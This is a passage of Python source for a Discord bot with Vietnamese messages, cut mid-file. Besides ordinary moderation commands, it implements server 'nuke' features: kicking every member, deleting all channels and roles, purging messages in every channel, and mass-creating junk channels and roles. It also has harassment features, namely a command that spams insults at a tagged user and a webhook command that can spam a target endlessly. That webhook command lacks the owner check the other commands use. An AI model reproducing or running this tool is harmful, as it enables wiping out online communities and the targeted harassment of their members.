async def stop_spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="spamroast")
@owner_only()
async def spam_roast(ctx, member: discord.Member, count: int = 10):
    if count > 50:
        count = 50
    await ctx.send(f"🚀 **Bắt đầu spam chửi {member.mention} ({count} lần)...**")
    for i in range(count):
        roast_template = random.choice(ROAST_LINES)
        msg = roast_template.format(username=member.mention)
        try:
            await ctx.send(msg)
        except:
            pass
        await asyncio.sleep(0.8)

@spam_roast.error
async def spam_roast_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH QUẢN TRỊ ====================
@bot.command(name="kick")
@owner_only()
async def kick_user(ctx, member: discord.Member, *, reason: str = "Không có lý do"):
    try:
        if member.id == ctx.author.id:
            await ctx.send("❌ Không thể kick chính mình!")
            return
        if member.id in BOT_OWNERS:
            await ctx.send("❌ Không thể kick Owner!")
            return
        await member.kick(reason=reason)
        embed = discord.Embed(title="🦵 ĐÃ KICK", description=f"👤 {member.mention}\n📌 Lý do: {reason}\n👑 {ctx.author.mention}", color=0xFF9900)
        embed.set_thumbnail(url=member.display_avatar.url)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="ban")
@owner_only()
async def ban_user(ctx, member: discord.Member, *, reason: str = "Không có lý do"):
    try:
        if member.id == ctx.author.id:
            await ctx.send("❌ Không thể ban chính mình!")
            return
        if member.id in BOT_OWNERS:
            await ctx.send("❌ Không thể ban Owner!")
            return
        await member.ban(reason=reason)
        embed = discord.Embed(title="🔨 ĐÃ BAN", description=f"👤 {member.mention}\n📌 Lý do: {reason}\n👑 {ctx.author.mention}", color=0xFF0000)
        embed.set_thumbnail(url=member.display_avatar.url)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="unban")
@owner_only()
async def unban_user(ctx, user_id: int, *, reason: str = "Không có lý do"):
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user, reason=reason)
        embed = discord.Embed(title="✅ ĐÃ UNBAN", description=f"👤 {user.mention}\n📌 Lý do: {reason}\n👑 {ctx.author.mention}", color=0x00FF00)
        embed.set_thumbnail(url=user.display_avatar.url)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="massban")
@owner_only()
async def massban(ctx, *members: discord.Member):
    if not members:
        await ctx.send("❌ Cần tag ít nhất 1 người. VD: `n! massban @user1 @user2`")
        return
    success = 0
    failed = 0
    for member in members:
        if member.id == ctx.author.id or member.id in BOT_OWNERS or member == ctx.guild.owner:
            failed += 1
            continue
        try:
            await member.ban(reason="Mass ban từ Boss Bảo")
            success += 1
        except:
            failed += 1
    embed = discord.Embed(title="🔨 KẾT QUẢ MASS BAN", description=f"✅ Đã ban: **{success}**\n❌ Thất bại: **{failed}**", color=0xFF0000)
    await ctx.send(embed=embed)

@bot.command(name="mute")
@owner_only()
async def mute(ctx, member: discord.Member, duration: str = None, *, reason="Không có lý do"):
    try:
        time_delta = None
        duration_text = "Vĩnh viễn"
        if duration:
            unit = duration[-1].lower()
            try:
                val = int(duration[:-1])
            except ValueError:
                await ctx.send("❌ Sai định dạng thời gian! Ví dụ: `10m`, `2d`, `1w`, `1t`.")
                return
            if unit == 'm':
                time_delta = timedelta(minutes=val)
                duration_text = f"{val} phút"
            elif unit == 'd':
                time_delta = timedelta(days=val)
                duration_text = f"{val} ngày"
            elif unit == 'w':
                time_delta = timedelta(weeks=val)
                duration_text = f"{val} tuần"
            elif unit == 't':
                time_delta = timedelta(days=val*30)
                duration_text = f"{val} tháng"
            else:
                await ctx.send("❌ Đơn vị không hợp lệ! Dùng: m, d, w, t.")
                return
        muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
        if not muted_role:
            muted_role = await ctx.guild.create_role(name="Muted", permissions=discord.Permissions(send_messages=False, speak=False))
            for channel in ctx.guild.channels:
                try:
                    await channel.set_permissions(muted_role, send_messages=False, speak=False)
                except:
                    pass
        await member.add_roles(muted_role, reason=f"Lệnh từ Boss Bảo - {reason}")
        if time_delta:
            try:
                await member.timeout(time_delta, reason=reason)
            except:
                pass
        embed = discord.Embed(title="🔇 ĐÃ MUTE", description=f"👤 {member.mention}\n⏳ {duration_text}\n📌 {reason}", color=0xFF9900)
        await ctx.send(embed=embed)
        try:
            dm_embed = discord.Embed(title="🔇 BẠN ĐÃ BỊ MUTE", description=f"🏰 {ctx.guild.name}\n⏳ {duration_text}\n📌 {reason}", color=0xFF0000)
            await member.send(embed=dm_embed)
        except:
            pass
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="unmute")
@owner_only()
async def unmute(ctx, member: discord.Member):
    try:
        muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
        if muted_role and muted_role in member.roles:
            await member.remove_roles(muted_role, reason="Lệnh từ Boss Bảo")
        try:
            await member.timeout(None, reason="Lệnh unmute từ Boss Bảo")
        except:
            pass
        embed = discord.Embed(title="🔊 ĐÃ UNMUTE", description=f"👤 {member.mention} đã được bỏ mute.", color=0x00FF00)
        await ctx.send(embed=embed)
        try:
            dm_embed = discord.Embed(title="🔊 BẠN ĐÃ ĐƯỢC UNMUTE", description=f"✨ Chúc mừng! Bạn đã được gỡ mute tại **{ctx.guild.name}**", color=0x00FF00)
            await member.send(embed=dm_embed)
        except:
            pass
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="timeout")
@owner_only()
async def timeout(ctx, member: discord.Member, duration: str, *, reason="Không có lý do"):
    try:
        unit = duration[-1].lower()
        val = int(duration[:-1])
        if unit == 'm':
            td = timedelta(minutes=val)
        elif unit == 'd':
            td = timedelta(days=val)
        elif unit == 'w':
            td = timedelta(weeks=val)
        elif unit == 't':
            td = timedelta(days=val*30)
        else:
            await ctx.send("❌ Đơn vị không hợp lệ! Dùng m, d, w, t.")
            return
        await member.timeout(td, reason=reason)
        embed = discord.Embed(title="⏳ ĐÃ TIMEOUT", description=f"👤 {member.mention}\n⏳ {duration}\n📌 {reason}", color=0xFF9900)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="deafen")
@owner_only()
async def deafen(ctx, member: discord.Member):
    try:
        await member.edit(deafen=True)
        embed = discord.Embed(title="🔇 ĐÃ DEAFEN", description=f"{member.mention} đã bị điếc.", color=0xFF9900)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="undeafen")
@owner_only()
async def undeafen(ctx, member: discord.Member):
    try:
        await member.edit(deafen=False)
        embed = discord.Embed(title="🔊 ĐÃ UNDEAFEN", description=f"{member.mention} đã có thể nghe.", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="move")
@owner_only()
async def move_member(ctx, member: discord.Member, channel: discord.VoiceChannel):
    try:
        await member.move_to(channel)
        embed = discord.Embed(title="🚪 ĐÃ DI CHUYỂN", description=f"{member.mention} đã chuyển vào {channel.mention}", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="moveall")
@owner_only()
async def move_all_voice(ctx, channel: discord.VoiceChannel = None):
    if channel is None:
        await ctx.send("❌ Vui lòng tag voice channel! VD: `n! moveall #voice`")
        return
    try:
        count = 0
        for vc in ctx.guild.voice_channels:
            for member in vc.members:
                await member.move_to(channel)
                count += 1
                await asyncio.sleep(0.1)
        embed = discord.Embed(title="🚪 ĐÃ DI CHUYỂN TẤT CẢ", description=f"✅ Đã di chuyển **{count}** người vào {channel.mention}", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="warn")
@owner_only()
async def warn(ctx, member: discord.Member, *, reason="Cảnh cáo chung"):
    try:
        embed = discord.Embed(title="⚠️ CẢNH CÁO TỪ BOSS BẢO", description=f"Bạn đã bị cảnh cáo trong server **{ctx.guild.name}**\n📌 Lý do: {reason}", color=0xFF0000)
        await member.send(embed=embed)
        await ctx.send(f"✅ Đã gửi cảnh cáo đến {member.mention}.")
    except:
        await ctx.send("❌ Không thể gửi tin nhắn riêng cho thành viên này.")

@bot.command(name="kickall")
@owner_only()
async def kick_all_members(ctx):
    try:
        confirm_embed = discord.Embed(title="⚠️ XÁC NHẬN KICK TẤT CẢ", description="Gõ `n! confirmkickall` để xác nhận.", color=0xFF0000)
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "n! confirmkickall":
                await ctx.send("❌ Hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian.")
            return
        embed = discord.Embed(title="🚀 ĐANG KICK...", color=0xFF0000)
        await ctx.send(embed=embed)
        members = [m for m in ctx.guild.members if not m.bot and m.id not in BOT_OWNERS and m.id != ctx.guild.owner_id]
        for i in range(0, len(members), 10):
            batch = members[i:i+10]
            tasks = [m.kick(reason="Server nuke theo lệnh Boss Bảo") for m in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(1)
        complete_embed = discord.Embed(title="✅ KICK HOÀN TẤT", color=0x00FF00)
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="masskick")
@owner_only()
async def masskick(ctx, *members: discord.Member):
    if not members:
        await ctx.send("❌ Cần tag ít nhất 1 người. VD: `n! masskick @user1 @user2`")
        return
    success = 0
    failed = 0
    for member in members:
        if member.id == ctx.author.id or member.id in BOT_OWNERS or member == ctx.guild.owner:
            failed += 1
            continue
        try:
            await member.kick(reason="Mass kick từ Boss Bảo")
            success += 1
        except:
            failed += 1
    embed = discord.Embed(title="👢 MASS KICK", description=f"✅ Đã kick **{success}** người\n❌ Thất bại: **{failed}** người", color=0xFF9900 if failed else 0x00FF00)
    await ctx.send(embed=embed)

# ==================== LỆNH QUẢN LÝ KÊNH & ROLE ====================
@bot.command(name="createchannel")
@owner_only()
async def create_channel(ctx, *, name: str):
    try:
        channel = await ctx.guild.create_text_channel(name)
        embed = discord.Embed(title="🆕 ĐÃ TẠO KÊNH", description=f"{channel.mention}", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="deletechannel")
@owner_only()
async def delete_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        channel_name = channel.name
        await channel.delete()
        embed = discord.Embed(title="🗑️ ĐÃ XÓA KÊNH", description=f"`{channel_name}`", color=0xFF0000)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="lockchannel", aliases=["lock"])
@owner_only()
async def lock_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, send_messages=False)
        embed = discord.Embed(title="🔒 ĐÃ KHÓA KÊNH", description=f"{channel.mention}", color=0xFF0000)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="unlockchannel", aliases=["unlock"])
@owner_only()
async def unlock_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, send_messages=True)
        embed = discord.Embed(title="🔓 ĐÃ MỞ KHÓA", description=f"{channel.mention}", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="createrole")
@owner_only()
async def create_role(ctx, *, role_name: str):
    try:
        role = await ctx.guild.create_role(name=role_name, reason="Lệnh từ Boss Bảo")
        embed = discord.Embed(title="🎭 ĐÃ TẠO ROLE", description=f"{role.mention}", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="deleterole")
@owner_only()
async def delete_role(ctx, *, role_name: str):
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        await role.delete(reason="Lệnh từ Boss Bảo")
        embed = discord.Embed(title="🗑️ ĐÃ XÓA ROLE", description=f"`{role_name}`", color=0xFF0000)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="role")
@owner_only()
async def add_role_to_user(ctx, member: discord.Member, *, role_name: str):
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        await member.add_roles(role, reason="Lệnh từ Boss Bảo")
        embed = discord.Embed(title="✅ ĐÃ THÊM ROLE", description=f"👤 {member.mention}\n🎭 {role.mention}", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="removerole")
@owner_only()
async def remove_role_from_user(ctx, member: discord.Member, *, role_name: str):
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        await member.remove_roles(role, reason="Lệnh từ Boss Bảo")
        embed = discord.Embed(title="✅ ĐÃ XÓA ROLE", description=f"👤 {member.mention}\n🎭 {role.mention}", color=0xFF9900)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="purge")
@owner_only()
async def purge_all(ctx, confirm: str = None):
    if confirm is None or confirm.lower() != "all":
        await ctx.send("⚠️ Gõ `n! purge all` để xác nhận xóa toàn bộ tin nhắn.")
        return
    embed = discord.Embed(title="🧹 ĐANG XÓA...", color=0xFF9900)
    await ctx.send(embed=embed)
    try:
        total_deleted = 0
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    deleted = await channel.purge(limit=1000)
                    total_deleted += len(deleted)
                    await asyncio.sleep(1)
                except:
                    pass
        embed = discord.Embed(title="✅ ĐÃ XÓA TOÀN BỘ", description=f"Đã xóa **{total_deleted}** tin nhắn.", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="clear")
@owner_only()
async def clear(ctx, amount: int = 10):
    if amount < 1 or amount > 1000:
        await ctx.send("⚠️ Số lượng từ 1 đến 1000.")
        return
    try:
        deleted = await ctx.channel.purge(limit=amount)
        embed = discord.Embed(title="🧹 ĐÃ XÓA", description=f"Đã xóa **{len(deleted)}** tin nhắn.", color=0x00CCFF)
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="createcategory")
@owner_only()
async def create_category(ctx, *, name: str):
    try:
        category = await ctx.guild.create_category(name)
        embed = discord.Embed(title="📁 ĐÃ TẠO DANH MỤC", description=f"**{category.name}**", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="renamechannel")
@owner_only()
async def rename_channel(ctx, channel: discord.TextChannel, *, new_name: str):
    try:
        old_name = channel.name
        await channel.edit(name=new_name)
        embed = discord.Embed(title="✏️ ĐÃ ĐỔI TÊN KÊNH", description=f"**Tên cũ:** `{old_name}`\n**Tên mới:** `{new_name}`", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="settopic")
@owner_only()
async def set_topic(ctx, channel: discord.TextChannel, *, topic: str):
    try:
        await channel.edit(topic=topic)
        embed = discord.Embed(title="📝 ĐÃ ĐẶT CHỦ ĐỀ", description=f"{channel.mention}\n**Chủ đề:** {topic}", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="setnsfw")
@owner_only()
async def set_nsfw(ctx, channel: discord.TextChannel, nsfw: bool):
    try:
        await channel.edit(nsfw=nsfw)
        status = "Bật" if nsfw else "Tắt"
        embed = discord.Embed(title="🔞 ĐÃ THAY ĐỔI NSFW", description=f"{channel.mention}\n**Trạng thái:** {status}", color=0x00FF00 if nsfw else 0xFF9900)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="hide")
@owner_only()
async def hide_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, view_channel=False)
        embed = discord.Embed(title="🙈 ĐÃ ẨN KÊNH", description=f"{channel.mention}", color=0xFF9900)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="reveal")
@owner_only()
async def reveal_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, view_channel=True)
        embed = discord.Embed(title="👀 ĐÃ HIỆN KÊNH", description=f"{channel.mention}", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="vc")
@owner_only()
async def create_voice_channel(ctx, *, name: str):
    try:
        channel = await ctx.guild.create_voice_channel(name)
        embed = discord.Embed(title="🔊 ĐÃ TẠO VOICE", description=f"{channel.mention}", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="clonechannel")
@owner_only()
async def clone_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        new_channel = await channel.clone()
        embed = discord.Embed(title="📋 ĐÃ CLONE KÊNH", description=f"Đã clone {channel.mention} thành {new_channel.mention}", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="deleteallchannels")
@owner_only()
async def delete_all_channels(ctx):
    try:
        confirm_embed = discord.Embed(title="⚠️ XÁC NHẬN XÓA TẤT CẢ KÊNH", description="Gõ `n! confirmdelete` để xác nhận.", color=0xFF0000)
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "n! confirmdelete":
                await ctx.send("❌ Hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian.")
            return
        embed = discord.Embed(title="🚀 ĐANG XÓA...", color=0xFF0000)
        await ctx.send(embed=embed)
        channels = list(ctx.guild.channels)
        for i in range(0, len(channels), 15):
            batch = channels[i:i+15]
            tasks = [ch.delete() for ch in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.5)
        complete_embed = discord.Embed(title="✅ XÓA KÊNH HOÀN TẤT", color=0x00FF00)
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="spamchannels")
@owner_only()
async def spam_channels(ctx, amount: int = 100):
    if amount > 200:
        amount = 200
    try:
        embed = discord.Embed(title="🚀 ĐANG TẠO KÊNH SPAM", color=0xFF69B4)
        await ctx.send(embed=embed)
        for i in range(0, amount, 10):
            batch = []
            for j in range(i, min(i+10, amount)):
                channel_name = NUKE_CHANNEL_NAMES[j % len(NUKE_CHANNEL_NAMES)]
                batch.append(ctx.guild.create_text_channel(name=channel_name))
            await asyncio.gather(*batch, return_exceptions=True)
            await asyncio.sleep(0.5)
        complete_embed = discord.Embed(title="✅ TẠO KÊNH HOÀN TẤT", description=f"Đã tạo {amount} kênh.", color=0x00FF00)
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="spamroles")
@owner_only()
async def spam_roles(ctx, amount: int = 50):
    if amount > 250:
        amount = 250
    try:
        embed = discord.Embed(title="🚀 ĐANG TẠO ROLE", color=0xFF69B4)
        await ctx.send(embed=embed)
        for i in range(0, amount, 10):
            batch = []
            for j in range(i, min(i+10, amount)):
                role_name = NUKE_CHANNEL_NAMES[j % len(NUKE_CHANNEL_NAMES)]
                color = discord.Color(random.randint(0, 0xFFFFFF))
                batch.append(ctx.guild.create_role(name=role_name, color=color, hoist=True, mentionable=True))
            await asyncio.gather(*batch, return_exceptions=True)
            await asyncio.sleep(0.5)
        complete_embed = discord.Embed(title="✅ TẠO ROLE HOÀN TẤT", description=f"Đã tạo {amount} role.", color=0x00FF00)
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="deleteallroles")
@owner_only()
async def delete_all_roles(ctx):
    try:
        confirm_embed = discord.Embed(title="⚠️ XÁC NHẬN XÓA TẤT CẢ ROLE", description="Gõ `n! confirmdeleteroles` để xác nhận.", color=0xFF0000)
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "n! confirmdeleteroles":
                await ctx.send("❌ Hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian.")
            return
        embed = discord.Embed(title="🚀 ĐANG XÓA...", color=0xFF0000)
        await ctx.send(embed=embed)
        roles = [r for r in ctx.guild.roles if r.name != "@everyone"]
        for i in range(0, len(roles), 10):
            batch = roles[i:i+10]
            tasks = [r.delete() for r in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.5)
        complete_embed = discord.Embed(title="✅ XÓA ROLE HOÀN TẤT", color=0x00FF00)
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="slowmode")
@owner_only()
async def set_slowmode(ctx, seconds: int = 0):
    if seconds < 0 or seconds > 21600:
        await ctx.send("❌ Nhập từ 0 đến 21600 giây!")
        return
    try:
        await ctx.channel.edit(slowmode_delay=seconds)
        embed = discord.Embed(title="🐢 ĐÃ CÀI SLOWMODE", description=f"{ctx.channel.mention}\n⏳ {seconds} giây", color=0x00FF00 if seconds > 0 else 0xFF9900)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="nick")
@owner_only()
async def set_nickname(ctx, member: discord.Member, *, nickname: str = None):
    if nickname is None:
        await ctx.send("❌ Vui lòng nhập nickname! VD: `n! nick @user Tên mới`")
        return
    try:
        old_name = member.display_name
        await member.edit(nick=nickname)
        embed = discord.Embed(title="✏️ ĐÃ ĐỔI NICKNAME", description=f"👤 {member.mention}\n**Tên cũ:** `{old_name}`\n**Tên mới:** `{nickname}`", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="resetnick")
@owner_only()
async def reset_nickname(ctx, member: discord.Member):
    try:
        await member.edit(nick=None)
        embed = discord.Embed(title="🔄 ĐÃ RESET NICKNAME", description=f"👤 {member.mention}", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="setservername")
@owner_only()
async def set_server_name(ctx, *, new_name: str):
    try:
        if len(new_name) > 100:
            new_name = new_name[:100]
        await ctx.guild.edit(name=new_name)
        embed = discord.Embed(title="✅ ĐÃ ĐỔI TÊN SERVER", description=f"🎉 **{new_name}**", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="setservericon")
@owner_only()
async def set_server_icon(ctx, url: str = None):
    try:
        if url:
            if not url.startswith(('http://', 'https://')):
                raise ValueError("URL không hợp lệ")
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        raise ValueError("Không tải được ảnh")
                    image_data = await resp.read()
        else:
            image_data = None
        await ctx.guild.edit(icon=image_data)
        embed = discord.Embed(title="✅ ĐÃ ĐỔI ICON", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="rename")
@owner_only()
async def rename_server(ctx, *, new_name: str):
    if len(new_name) > 100:
        new_name = new_name[:100]
    try:
        old_name = ctx.guild.name
        await ctx.guild.edit(name=new_name)
        embed = discord.Embed(title="✏️ ĐÃ ĐỔI TÊN SERVER", description=f"**Tên cũ:** `{old_name}`\n**Tên mới:** `{new_name}`", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="icon")
@owner_only()
async def set_icon(ctx, url: str = None):
    try:
        if url:
            if not url.startswith(('http://', 'https://')):
                await ctx.send("❌ URL không hợp lệ!")
                return
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        await ctx.send("❌ Không tải được ảnh!")
                        return
                    image_data = await resp.read()
        elif ctx.message.attachments:
            image_data = await ctx.message.attachments[0].read()
        else:
            await ctx.send("❌ Vui lòng upload ảnh hoặc nhập URL!")
            return
        await ctx.guild.edit(icon=image_data)
        embed = discord.Embed(title="🖼️ ĐÃ ĐỔI ICON SERVER", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="emoji")
@owner_only()
async def list_emoji(ctx):
    emojis = ctx.guild.emojis
    if not emojis:
        await ctx.send("📭 Server này chưa có emoji nào!")
        return
    emoji_list = []
    for e in emojis:
        emoji_list.append(f"{e} - `{e.name}`")
    embed = discord.Embed(title=f"🎨 DANH SÁCH EMOJI ({len(emojis)})", description="\n".join(emoji_list[:25]), color=0x00CCFF)
    await ctx.send(embed=embed)

@bot.command(name="steal")
@owner_only()
async def steal_emoji(ctx, emoji_id: int, *, name: str = None):
    if name is None:
        name = f"emoji_{emoji_id}"
    try:
        emoji = await bot.fetch_emoji(emoji_id)
        if not emoji:
            await ctx.send("❌ Không tìm thấy emoji!")
            return
        async with aiohttp.ClientSession() as session:
            async with session.get(emoji.url) as resp:
                if resp.status != 200:
                    await ctx.send("❌ Không tải được ảnh!")
                    return
                image_data = await resp.read()
        new_emoji = await ctx.guild.create_custom_emoji(name=name, image=image_data)
        embed = discord.Embed(title="🎨 ĐÃ COPY EMOJI", description=f"{new_emoji} - `{new_emoji.name}`", color=0x00FF00)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

# ==================== LỆNH WEBHOOK ====================
@bot.command(name="addwebhook")
@owner_only()
async def addwebhook(ctx, name: str, count: int = 1):
    if count < 1:
        await ctx.send("❌ Số lượng phải lớn hơn 0!")
        return
    if count > 50:
        count = 50
        await ctx.send("⚠️ Giới hạn tối đa 50 webhook mỗi lần.")
    created = 0
    failed = 0
    for i in range(count):
        try:
            webhook_name = f"{name}_{i+1}" if count > 1 else name
            wh = await ctx.channel.create_webhook(name=webhook_name)
            webhooks[webhook_name] = wh
            created += 1
        except Exception:
            failed += 1
    embed = discord.Embed(title="✅ TẠO WEBHOOK", description=f"Đã tạo **{created}** webhook, thất bại: **{failed}**", color=0x00FF00 if failed == 0 else 0xFF9900)
    await ctx.send(embed=embed)

@bot.command(name="webhookspam")
async def webhookspam(ctx, target: discord.Member, content: str, count: int = None, webhook_name: str = None):
    if not ctx.author.guild_permissions.manage_webhooks and ctx.author.id not in BOT_OWNERS:
        await ctx.send("❌ Bạn cần quyền Quản lý Webhook!")
        return
    wh = None
    if webhook_name and webhook_name in webhooks:
        wh = webhooks[webhook_name]
    else:
        try:
            wh = await ctx.channel.create_webhook(name=f"Spam_{random.randint(1000,9999)}")
            webhooks[wh.name] = wh
        except Exception as e:
            await ctx.send(f"❌ Không thể tạo webhook: {str(e)}")
            return
    if not wh:
        await ctx.send("❌ Không tìm thấy webhook.")
        return
    if count is None:
        async def infinite_spam():
            while True:
                try:
                    await wh.send(content=f"{target.mention} {content}")
                    await asyncio.sleep(0.1)
                except Exception:
                    break
        asyncio.create_task(infinite_spam())
        await ctx.send(f"🚀 Đã bắt đầu spam vô hạn tới {target.mention}. Dùng `n! stopwebhookspam` để dừng.")
    else:
        if count < 1 or count > 1000:
            await ctx.send("❌ Số lượng tin nhắn từ 1 đến 1000.")
            return
        sent = 0
        for _ in range(count):
            try:
                await wh.send(content=f"{target.mention} {content}")
                sent += 1
                await asyncio.sleep(0.1)
            except Exception:
                break
        await ctx.send(f"✅ Đã spam {sent}/{count} tin nhắn tới {target.mention}.")

@bot.command(name="stopwebhookspam")
@owner_only()
async def stop_webhook_spam(ctx):
    webhooks_in_channel = await ctx.channel.webhooks()
    for wh in webhooks_in_channel:
        try:
            await wh.delete()
        except:
            pass
    await ctx.send("🛑 Đã dừng webhook spam.")

# ==================== LỆNH CÀI ĐẶT KÊNH ====================
@bot.command(name="setwelcome")
@owner_only()
async def set_welcome_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        if str(ctx.guild.id) in WELCOME_CHANNELS:
